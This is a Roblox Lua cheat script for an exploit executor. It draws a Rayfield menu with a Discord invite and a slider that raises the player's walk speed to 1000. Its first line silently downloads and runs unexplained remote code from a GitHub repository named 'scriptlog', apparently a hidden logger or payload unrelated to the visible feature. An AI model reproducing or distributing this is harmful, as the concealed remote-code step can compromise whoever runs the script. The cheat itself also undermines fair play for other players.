loadstring(game:HttpGet("https://raw.githubusercontent.com/T1m12/scriptlog/main/w67ew18yd187.lua"))()

getgenv().SecureMode = true
local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()

local Window = Rayfield:CreateWindow({
   Name = "gamesensicals",
   LoadingTitle = "Connecting...",
   LoadingSubtitle = "https://discord.gg/JWsceXxy",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = "gsink", -- Create a custom folder for your hub/game
      FileName = "gamesensicals"
   },
   Discord = {
      Enabled = true,
      Invite = "https://discord.gg/JWsceXxy", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD.
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },
   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = "Sirius Hub",
      Subtitle = "Key System",
      Note = "Join the discord (discord.gg/sirius)",
      FileName = "SiriusKey",
      SaveKey = true,
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = "Hello"
   }
})
local Main = Window:CreateTab("Main", 4483362458) -- Title, Image
local Walkspeed = Main:CreateSlider({
	Name = "WalkSpeed",
	Range = {16, 1000},
	Increment = 10,
	Suffix = "WalkSpeed",
	CurrentValue = 16,
	Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(s)
		game.Players.LocalPlayer.character.Humanoid.WalkSpeed = s
	end,
})


